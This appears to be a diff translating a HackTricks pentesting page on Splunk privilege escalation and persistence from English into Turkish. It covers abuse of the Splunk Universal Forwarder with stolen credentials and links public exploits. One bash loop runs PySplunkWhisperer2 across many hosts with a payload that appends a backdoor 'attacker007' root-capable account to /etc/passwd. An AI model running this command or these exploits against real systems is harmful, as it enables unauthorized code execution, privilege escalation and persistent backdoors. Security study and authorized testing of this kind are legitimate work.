@@ -1,52 +1,50 @@
-# Splunk LPE and Persistence
+# Splunk LPE ve Süreklilik
 
 {{#include ../../banners/hacktricks-training.md}}
 
-If **enumerating** a machine **internally** or **externally** you find **Splunk running** (port 8090), if you luckily know any **valid credentials** you can **abuse the Splunk service** to **execute a shell** as the user running Splunk. If root is running it, you can escalate privileges to root.
+Eğer bir makineyi **içten** veya **dıştan** **numaralandırıyorsanız** ve **Splunk çalışıyorsa** (port 8090), şanslıysanız herhangi bir **geçerli kimlik bilgisi** biliyorsanız, **Splunk hizmetini kötüye kullanarak** Splunk'ı çalıştıran kullanıcı olarak **bir shell** çalıştırabilirsiniz. Eğer root çalışıyorsa, yetkileri root'a yükseltebilirsiniz.
 
-Also if you are **already root and the Splunk service is not listening only on localhost**, you can **steal** the **password** file **from** the Splunk service and **crack** the passwords, or **add new** credentials to it. And maintain persistence on the host.
+Ayrıca eğer **zaten root iseniz ve Splunk hizmeti yalnızca localhost'ta dinlemiyorsa**, Splunk hizmetinden **şifre** dosyasını **çalıp** şifreleri **kırabilir** veya **yeni** kimlik bilgileri ekleyebilirsiniz. Ve host üzerinde sürekliliği sürdürebilirsiniz.
 
-In the first image below you can see how a Splunkd web page looks like.
+Aşağıdaki ilk resimde bir Splunkd web sayfasının nasıl göründüğünü görebilirsiniz.
 
-## Splunk Universal Forwarder Agent Exploit Summary
+## Splunk Universal Forwarder Agent İstismar Özeti
 
-For further details check the post [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). This is just a sumary:
+Daha fazla detay için [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/) gönderisini kontrol edin. Bu sadece bir özet:
 
-**Exploit Overview:**
-An exploit targeting the Splunk Universal Forwarder Agent (UF) allows attackers with the agent password to execute arbitrary code on systems running the agent, potentially compromising an entire network.
+**İstismar Genel Görünümü:**
+Splunk Universal Forwarder Agent (UF) hedef alan bir istismar, ajan şifresine sahip saldırganların ajanı çalıştıran sistemlerde rastgele kod çalıştırmasına olanak tanır ve potansiyel olarak tüm bir ağı tehlikeye atabilir.
 
-**Key Points:**
+**Ana Noktalar:**
 
-- The UF agent does not validate incoming connections or the authenticity of code, making it vulnerable to unauthorized code execution.
-- Common password acquisition methods include locating them in network directories, file shares, or internal documentation.
-- Successful exploitation can lead to SYSTEM or root level access on compromised hosts, data exfiltration, and further network infiltration.
+- UF ajanı gelen bağlantıları veya kodun doğruluğunu doğrulamaz, bu da yetkisiz kod çalıştırmaya karşı savunmasız hale getirir.
+- Yaygın şifre edinme yöntemleri, bunları ağ dizinlerinde, dosya paylaşımlarında veya iç belgelerde bulmayı içerir.
+- Başarılı bir istismar, tehlikeye atılan hostlarda SYSTEM veya root düzeyinde erişim, veri sızdırma ve daha fazla ağ sızması ile sonuçlanabilir.
 
-**Exploit Execution:**
+**İstismar Uygulaması:**
 
-1. Attacker obtains the UF agent password.
-2. Utilizes the Splunk API to send commands or scripts to the agents.
-3. Possible actions include file extraction, user account manipulation, and system compromise.
+1. Saldırgan UF ajan şifresini elde eder.
+2. Ajanlara komutlar veya betikler göndermek için Splunk API'sini kullanır.
+3. Olası eylemler arasında dosya çıkarma, kullanıcı hesabı manipülasyonu ve sistemin tehlikeye atılması yer alır.
 
-**Impact:**
+**Etkisi:**
 
-- Full network compromise with SYSTEM/root level permissions on each host.
-- Potential for disabling logging to evade detection.
-- Installation of backdoors or ransomware.
+- Her hostta SYSTEM/root düzeyinde izinlerle tam ağ tehlikesi.
+- Tespiti önlemek için günlük kaydını devre dışı bırakma potansiyeli.
+- Arka kapılar veya fidye yazılımlarının kurulumu.
 
-**Example Command for Exploitation:**
-
+**İstismar için Örnek Komut:**
 ```bash
 for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
 ```
-
-**Usable public exploits:**
+**Kullanılabilir kamuya açık exploitler:**
 
 - https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
 - https://www.exploit-db.com/exploits/46238
 - https://www.exploit-db.com/exploits/46487
 
-## Abusing Splunk Queries
+## Splunk Sorgularını Kötüye Kullanma
 
-**For further details check the post [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)**
+**Daha fazla detay için [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis) gönderisini kontrol edin** 
 
 {{#include ../../banners/hacktricks-training.md}}
